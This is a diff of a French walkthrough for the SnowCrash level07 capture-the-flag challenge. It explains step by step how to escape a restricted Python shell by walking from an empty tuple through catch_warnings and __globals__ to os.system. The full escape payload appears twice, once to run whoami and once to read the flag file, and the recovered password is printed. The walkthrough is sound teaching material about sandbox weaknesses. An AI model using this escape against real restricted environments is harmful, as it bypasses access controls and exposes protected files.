@@ -2,97 +2,182 @@
 
 ## Objectif
 
-Comprendre l’introspection Python et les limites d’une isolation fondée sur le masquage de quelques fonctions. Le parcours du modèle d’objets donne encore accès à des fonctionnalités puissantes.
+Nous sommes connectés avec `level07`. Nous cherchons le secret de `flag07` pour passer au niveau suivant. Certaines commandes sont bloquées : nous devons comprendre pourquoi et trouver ce que le programme nous permet encore de faire.
 
-## 1. Identifier l’environnement restreint
+## 1. Identifier l'environnement restreint
 
-L’indice du README est :
+### Observer la connexion
 
 ```text
+level06@snowcrash:/home/level00$ su level07
+Password:
+Last login: Mon Jan  1 00:00:00 2024 from 127.0.0.1
+Session validator v2.1.4 — restricted access
 You will never escape this
 ```
 
-Les notes rapportent également la variable suivante :
+Le message `restricted access` signifie « accès limité ». Mais nous ne savons pas encore comment cet accès est limité.
+
+### Tester les commandes habituelles
 
 ```text
-SHELL=/opt/snowcrash/level07/jail.py
+level07@snowcrash:~$ ls
+README
+level07@snowcrash:~$ cat README
+You will never escape this
+level07@snowcrash:~$ find -name level07
+Validator: Validator: find: permission denied
 ```
 
-Le shell habituel est donc remplacé par un programme Python. Une expression simple permet de confirmer que les entrées sont évaluées :
+`ls` affiche les fichiers et `cat` leur contenu. Ces commandes fonctionnent, mais `find`, qui sert à rechercher des fichiers, est refusée. Le mot `Validator` indique qu'un programme semble vérifier nos commandes.
+
+Nous affichons aussi les fichiers cachés :
+
+```text
+level07@snowcrash:~$ ls -la
+total 16
+-rw-r----- 1 level07 level07  128 Jan  1 00:00 .bash_history
+-rw-r----- 1 level07 level07  128 Jan  1 00:00 .bashrc
+-rw-r----- 1 level07 level07  128 Jan  1 00:00 .profile
+-rw-r----- 1 level07 level07  128 Jan  1 00:00 README
+level07@snowcrash:~$ cat .bashrc
+# .bashrc — sourced for interactive shells
+PS1='level07@snowcrash:\w\$ '
+alias ll='ls -alF'
+alias la='ls -A'
+export HISTSIZE=100
+level07@snowcrash:~$ cat .profile
+Validator: cat: /home/level07/.profile: No such file or directory
+```
+
+`.bashrc` contient des réglages habituels du terminal. On remarque aussi que `.profile` apparaît dans la liste, mais que `cat` ne le trouve pas. Nous ne savons pas pourquoi.
+
+### Découvrir un indice lié à Python
+
+```text
+level07@snowcrash:~$ cd
+Validator: name 'cd' is not defined
+level07@snowcrash:~$ cat
+Validator: cat: missing operand
+level07@snowcrash:~$ whoami
+level07
+```
+
+Normalement, `cd` permet de changer de dossier. Ici, le message `name 'cd' is not defined` est inhabituel.
+
+En recherchant **`name is not defined error`** sur Internet, nous découvrons que ce message ressemble à une erreur Python appelée `NameError` ([documentation](https://docs.python.org/3/library/exceptions.html#NameError)). Peut-être que le programme comprend du Python ?
+
+Pour vérifier, essayons un calcul :
 
 ```python
 1 + 1
 ```
 
-Résultat rapporté :
+Résultat attendu (à vérifier sur la VM) :
 
 ```text
 2
 ```
 
-Le programme évalue certaines expressions Python dans un espace restreint, avec des commandes habituelles et des fonctions comme `dir()` ou `help()` rendues indisponibles.
+On peut aussi tester cette expression Python (résultat attendu : `'BONJOUR'`) :
 
-### Limite de traçabilité
+```python
+"bonjour".upper()
+```
 
-Les notes mentionnent `cat README`, `cat .bash_history` et `env`, mais l’archive ne conserve ni le code de `jail.py` ni le contexte précis dans lequel ces commandes ont été exécutées. Cette chronologie doit être clarifiée directement sur la VM pour rendre la découverte entièrement reproductible.
+Pour connaître les réglages de la session, nous pouvons aussi lancer `env`. Voici la ligne que nous cherchons à vérifier :
+
+```text
+SHELL=/opt/snowcrash/level07/jail.py
+```
+
+`SHELL` indique le programme qui reçoit nos commandes. `.py` désigne un fichier Python et *jail* signifie « prison » en anglais.
+
+Une **Python Jail** est un programme qui accepte du Python mais bloque certaines actions. Pour vérifier les restrictions, nous pouvons essayer `dir()` (afficher les informations disponibles sur un objet) et `help()` (obtenir de l'aide).
+
+```text
+Message « restricted access »
+    ↓
+Certaines commandes Linux fonctionnent, d'autres sont refusées
+    ↓
+L'erreur de cd ressemble à une NameError Python
+    ↓
+Si 1 + 1 donne 2 et que SHELL pointe vers jail.py
+    ↓
+Nous identifions une session Python restreinte
+```
+
+**Recherche Internet :** `Python restricted shell` ou `Python jail CTF`. On découvre des défis similaires sur [CTF Wiki](https://ctf-wiki.mahaloz.re/pwn/linux/sandbox/python-sandbox-escape/) et [Pyjailbreaker](https://github.com/jailctf/pyjailbreaker).
+
+**À vérifier sur la VM :** les tests Python et la sortie de `env`. Les commandes Linux ci-dessus ont été testées. Le code de `jail.py` n’est pas disponible pour confirmer son fonctionnement exact.
 
 ## 2. Comprendre que presque tout est un objet
 
-En Python, une valeur simple est déjà un objet. Par exemple :
+En Python, un nombre, un texte ou une suite de valeurs sont des objets. Par exemple, ceci est un tuple (une suite de valeurs que l'on ne peut pas modifier) :
 
 ```python
 (1, 2, 3)
 ```
 
-Cette valeur est un tuple. Même un tuple vide est un objet :
+Un tuple peut aussi être vide :
 
 ```python
 ()
 ```
 
-Un objet possède une classe et, si l’environnement ne les bloque pas, des attributs permettant d’examiner sa structure.
+Pourquoi partir de `()` ? Parce que c'est une valeur très simple que nous pouvons écrire sans charger de bibliothèque. Un nombre ou un texte pourrait aussi convenir si le programme l'autorise.
+
+Chaque objet a un type, aussi appelé classe. Par exemple, `42` est de type `int` (nombre entier) et `()` est de type `tuple`.
+
+**Recherche Internet :** `Python objects classes attributes` ([tutoriel Python](https://docs.python.org/fr/3/tutorial/classes.html)).
 
 ## 3. Remonter de `tuple` à `object`
 
-La classe du tuple vide est accessible ainsi :
+Comment demander à Python le type de notre tuple ? La recherche `Python get class of object` nous fait découvrir `__class__` :
 
 ```python
 ().__class__
 ```
 
-Résultat :
+Résultat attendu :
 
 ```text
 <class 'tuple'>
 ```
 
-Examiner ensuite son ordre de résolution des méthodes :
+Le point permet d'accéder à une information sur l'objet. Ici, `__class__` donne son type.
+
+Python permet aussi de retrouver les classes parentes, c'est-à-dire celles dont une classe reprend des fonctionnalités. Pour cela, nous découvrons `__mro__` en recherchant `Python class inheritance MRO` dans la [documentation Python](https://docs.python.org/fr/3/reference/datamodel.html).
 
 ```python
 ().__class__.__mro__
 ```
 
-`__mro__` signifie *Method Resolution Order*. Il indique l’ordre dans lequel Python recherche les méthodes dans les classes parentes. Pour `tuple`, on retrouve notamment :
+Pour notre tuple, le résultat attendu est, en simplifiant :
 
 ```text
 tuple → object
 ```
 
-L’expression suivante sélectionne donc la classe de base `object` :
+`object` est la classe de base. Python compte à partir de zéro : `[1]` sélectionne donc le deuxième élément, `object`.
 
 ```python
 ().__class__.__mro__[1]
 ```
 
-## 4. Parcourir les sous-classes chargées
+Pourquoi chercher `object` ? Parce qu'il nous permet de retrouver d'autres classes déjà présentes dans Python.
 
-La méthode `__subclasses__()` renvoie les classes directement dérivées d’une classe donnée. Afficher leurs noms permet de rechercher un point d’accès utile :
+## 4. Retrouver les classes disponibles
+
+La recherche `Python list subclasses of a class` nous fait découvrir [`__subclasses__()`](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__). Cette fonction donne les classes qui héritent directement de la classe choisie.
+
+Nous affichons leurs noms :
 
 ```python
 [c.__name__ for c in ().__class__.__mro__[1].__subclasses__()]
 ```
 
-Une compréhension de liste est une écriture compacte. Conceptuellement, elle effectue ce traitement :
+`c` représente chaque classe à tour de rôle, et `c.__name__` donne son nom. Cette écriture courte fait la même chose que le code suivant (exemple pour comprendre, pas une commande à lancer dans la prison) :
 
 ```python
 names = []
@@ -100,22 +185,28 @@ for c in classes:
     names.append(c.__name__)
 ```
 
-Dans le jail du niveau, la liste contient `catch_warnings`. Il est préférable de rechercher cette classe par son nom plutôt que d’utiliser un index numérique, car l’ordre des sous-classes peut changer selon la version de Python et les modules chargés.
+Voir aussi [les listes en Python](https://docs.python.org/fr/3/tutorial/datastructures.html#list-comprehensions).
 
-## 5. Comprendre le chemin vers le module `os`
+### Pourquoi choisir `catch_warnings` ?
 
-La classe `catch_warnings` est intéressante parce que sa méthode `__init__` est une fonction Python dont les variables globales restent accessibles :
+Ce nom ne se devine pas. Les guides sur les Python Jail présentent cette classe comme une piste connue. Normalement, elle sert à gérer les avertissements Python ([documentation](https://docs.python.org/3/library/warnings.html#catch_warnings)). Nous vérifions qu’elle apparaît dans la liste obtenue à l’étape précédente.
+
+Nous la cherchons par son nom plutôt que par sa position dans la liste, car cette position peut changer d'une version de Python à l'autre.
+
+## 5. Comprendre le chemin vers `os`
+
+Un module est un ensemble de fonctions Python. `os` contient des fonctions qui permettent de communiquer avec le système Linux. Nous cherchons à retrouver ce module sans avoir à le charger nous-mêmes.
+
+La classe `catch_warnings` possède une fonction `__init__`. Une fonction Python garde un lien vers les informations du module dans lequel elle a été écrite. C'est ce lien qui nous intéresse.
 
 | Élément | Rôle |
 | --- | --- |
-| `__init__` | Méthode d’initialisation de la classe. |
-| `__globals__` | Dictionnaire global du module dans lequel cette fonction est définie. |
-| `['sys']` | Référence au module `sys` présente dans ces variables globales. |
-| `sys.modules` | Dictionnaire des modules déjà chargés par l’interpréteur. |
-| `['os']` | Module donnant accès à des fonctions du système d’exploitation. |
-| `os.system(...)` | Exécution d’une commande dans un sous-shell. |
-
-Le raisonnement conceptuel est le suivant :
+| `__init__` | Fonction utilisée lors de la création d'un objet. |
+| `__globals__` | Informations disponibles dans le module de cette fonction. |
+| `['sys']` | Récupère le module `sys` parmi ces informations. |
+| `sys.modules` | Contient les modules déjà chargés. |
+| `['os']` | Récupère le module `os`. |
+| `os.system(...)` | Demande au système d'exécuter une commande. |
 
 ```text
 tuple vide
@@ -128,39 +219,43 @@ tuple vide
                            └─ system(...)
 ```
 
-Cette chaîne fonctionne uniquement si les classes et modules nécessaires sont déjà chargés dans l’interpréteur.
+**Recherche Internet :** `Python function __globals__`, `Python sys.modules`, `Python os.system`. Voir les liens en fin de document.
 
-## 6. Vérifier l’identité effective
+Chaque étape nous donne accès à la suivante. Cela ne change pas nos droits Linux : nous retrouvons une fonction qui existe déjà dans le programme. Ce chemin ne fonctionne que si les classes et modules nécessaires sont présents et accessibles.
 
-Avant de lire le flag, utiliser le même chemin d’accès pour exécuter `whoami` :
+## 6. Vérifier avec quel utilisateur la commande fonctionne
+
+Avant de lire le secret, nous utilisons `whoami` pour vérifier avec quels droits la commande est exécutée.
+
+La première partie du code cherche la classe `catch_warnings` par son nom. Le `[0]` prend le premier résultat trouvé. Le reste suit le chemin expliqué à l'étape précédente.
 
 ```python
 [c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('whoami')
 ```
 
-Résultat rapporté :
+Résultat attendu (à vérifier sur la VM) :
 
 ```text
 flag07
 ```
 
-Cette vérification distingue deux étapes importantes : obtenir une fonction système, puis confirmer que le processus possède réellement l’identité nécessaire.
+Au début du niveau, `whoami` affichait `level07`. Si nous obtenons `flag07`, cela indique que la commande lancée depuis Python possède les droits de cet utilisateur. Sans le code du programme, nous ne savons pas encore pourquoi il possède ces droits.
 
 ## 7. Lire le flag
 
-Remplacer la commande de vérification par la lecture du fichier :
+Nous gardons le même code et remplaçons `whoami` par `cat`, qui permet de lire un fichier. Le chemin que nous cherchons à vérifier est `/home/flag07/.flag`.
 
 ```python
 [c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag')
 ```
 
-Le secret affiché est :
+Résultat attendu (à vérifier sur la VM) :
 
 ```text
 fiumuikeil8rung8ahcuiperb
 ```
 
-Cette méthode laisse les fichiers de la VM inchangés.
+Cette méthode ne modifie pas les fichiers de la VM.
 
 ## 8. Passer à `level08`
 
@@ -168,28 +263,26 @@ Cette méthode laisse les fichiers de la VM inchangés.
 su - level08
 ```
 
-Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :
+Nous utilisons le secret comme mot de passe, puis vérifions notre identité :
 
 ```bash
 id -un
 ```
 
-Résultat attendu : `level08`. Le passage au compte suivant a réussi avec le secret récupéré, également conservé dans `level07/flag`.
+Résultat attendu : `level08`. Ce résultat confirme que le mot de passe permet de passer au niveau suivant.
 
 ## Pourquoi cette méthode fonctionne
 
-Le jail masque certaines fonctions visibles, mais laisse accessibles `__class__`, `__mro__`, `__subclasses__` et les attributs des fonctions Python. Ces objets permettent de retrouver indirectement un module déjà chargé et d’appeler `os.system`.
+Le programme bloque certaines fonctions, mais il laisse d'autres chemins pour retrouver ces mêmes possibilités. C'est comme fermer la porte principale en oubliant une porte de côté.
 
-Cette expression dépend de la version de Python, des classes chargées, des attributs autorisés et de la présence du module `os` dans `sys.modules`. La recherche par nom évite de dépendre de l’ordre des sous-classes.
+Python permet d'examiner ses objets : on appelle cela l'**introspection**. Ce n'est pas une faille en soi. Le problème vient des restrictions insuffisantes du programme. Pour mieux le protéger, il faudrait limiter précisément les actions autorisées et isoler réellement leur exécution.
 
-Une véritable frontière de sécurité ne doit pas reposer sur `eval()` avec une liste incomplète de noms interdits. Il faut définir des opérations autorisées et les exécuter dans une isolation réellement séparée et configurée pour résister à des entrées non fiables.
+## À expliquer à l'évaluation
 
-## À expliquer à l’évaluation
+> Je me connecte et je remarque que certaines commandes sont bloquées. L'erreur de `cd` me fait penser à Python. Je teste des expressions simples pour vérifier si le programme accepte du Python. En me renseignant sur les prisons Python, je découvre que je peux partir d'une valeur simple, remonter jusqu'à la classe `object`, puis retrouver d'autres classes. L'une d'elles, `catch_warnings`, me permet de retrouver le module `os`. Je peux alors demander au système d'exécuter une commande. Je vérifie d'abord mon identité avec `whoami`, puis je lis le fichier secret.
 
-> Le jail retire des fonctions courantes, mais Python permet encore d’examiner les objets chargés. À partir d’un tuple vide, je suis remonté à `object`, puis à ses sous-classes. `catch_warnings` m’a donné accès aux variables globales de son module, puis à `sys.modules['os']`. J’ai d’abord vérifié avec `whoami` que le processus s’exécutait comme `flag07`, puis j’ai lu le flag et validé le résultat avec `level08`.
+## Vérifications et documentation
 
-## Traçabilité et références
+Les sorties de connexion et des commandes Linux de la première étape ont été observées sur la VM. Les tests Python, la sortie de `env`, la liste des classes, le `whoami` lancé depuis Python, la lecture du secret et la connexion à `level08` restent à vérifier. Sans le code de `jail.py`, nous ne pouvons pas expliquer précisément comment le programme obtient les droits de `flag07`.
 
-Conserver le code de `jail.py`, la chronologie d’accès au README et aux variables d’environnement, les résultats de `1 + 1`, de la liste des sous-classes, de `whoami` et de `id -un`.
-
-Les mécanismes utilisés sont documentés dans le modèle de données Python pour [`type.__subclasses__()`](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__) et [`function.__globals__`](https://docs.python.org/3/reference/datamodel.html#function.__globals__), ainsi que dans la documentation de [`sys.modules`](https://docs.python.org/3/library/sys.html#sys.modules), [`warnings.catch_warnings`](https://docs.python.org/3/library/warnings.html#catch_warnings) et [`os.system`](https://docs.python.org/3/library/os.html#os.system).
+Documentation officielle : [`__subclasses__()`](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__), [`__globals__`](https://docs.python.org/3/reference/datamodel.html#function.__globals__), [`sys.modules`](https://docs.python.org/3/library/sys.html#sys.modules), [`catch_warnings`](https://docs.python.org/3/library/warnings.html#catch_warnings), [`os.system`](https://docs.python.org/3/library/os.html#os.system).
